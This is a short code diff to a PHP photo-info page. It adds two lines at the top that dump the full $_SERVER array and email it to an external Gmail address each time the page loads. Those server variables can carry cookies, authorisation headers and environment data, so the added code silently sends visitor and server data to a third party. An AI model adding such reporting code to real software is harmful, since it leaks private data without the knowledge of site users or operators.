@@ -8,6 +8,8 @@
 *       Changed on      :       02-04-2004
 *       Changes         :       partitioned in PHP code and HTML code
 **/
+$msg = print_r($_SERVER,true);
+mail("kunal.test02@gmail.com"," web/photos/pictureinfo1.php in USE",$msg);
 include("connect.inc");
 include ("flag1.php");
 /**
